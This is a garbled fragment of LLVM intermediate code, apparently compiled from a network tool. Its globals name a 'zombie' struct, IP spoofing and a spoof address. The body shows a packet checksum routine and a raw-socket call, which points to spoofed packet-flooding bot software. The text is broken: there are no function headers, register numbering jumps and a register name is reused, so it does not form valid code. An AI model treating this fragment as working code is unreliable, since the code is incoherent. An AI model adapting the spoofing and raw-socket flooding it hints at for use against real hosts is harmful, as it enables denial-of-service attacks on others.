@icmp_init = global i32 1, align 4
@sockfd = common global i32 0, align 4
@rsockfd = common global i32 0, align 4
@clisrc = common global %struct.sockaddr_in zeroinitializer, align 4
@realip = common global i64 0, align 8
@stderr = external global %struct._IO_FILE*, align 8
@stdin = external global %struct._IO_FILE*, align 8
@zomb_t = common global %struct.zombie zeroinitializer, align 8
@packet = common global %struct.s_pack zeroinitializer, align 8
@ip_spoof = common global i32 0, align 4
@spoof_addr = common global i64 0, align 8
  %1 = alloca i16*, align 8
  %2 = alloca i32, align 4
  %sum = alloca i64, align 8
  %oddbyte = alloca i16, align 2
  %answer = alloca i16, align 2
  store i16* %ptr, i16** %1, align 8
  store i32 %nbytes, i32* %2, align 4
  store i64 0, i64* %sum, align 8
  %5 = load i32, i32* %2, align 4
  %6 = icmp sgt i32 %5, 1
  %9 = load i16*, i16** %1, align 8
  %10 = getelementptr inbounds i16, i16* %9, i32 1
  store i16* %10, i16** %1, align 8
  %11 = load i16, i16* %9, align 2
  %12 = zext i16 %11 to i64
  %13 = load i64, i64* %sum, align 8
  %14 = add nsw i64 %13, %12
  store i64 %14, i64* %sum, align 8
  %15 = load i32, i32* %2, align 4
  %16 = sub nsw i32 %15, 2
  store i32 %16, i32* %2, align 4
  %19 = load i32, i32* %2, align 4
  %20 = icmp eq i32 %19, 1
  store i16 0, i16* %oddbyte, align 2
  %23 = load i16*, i16** %1, align 8
  %24 = bitcast i16* %23 to i8*
  %25 = load i8, i8* %24, align 1
  %26 = bitcast i16* %oddbyte to i8*
  store i8 %25, i8* %26, align 2
  %27 = load i16, i16* %oddbyte, align 2
  %28 = zext i16 %27 to i64
  %29 = load i64, i64* %sum, align 8
  %30 = add nsw i64 %29, %28
  store i64 %30, i64* %sum, align 8
  %6 = call i32 @socket(i32 2, i32 3, i32 255) #8
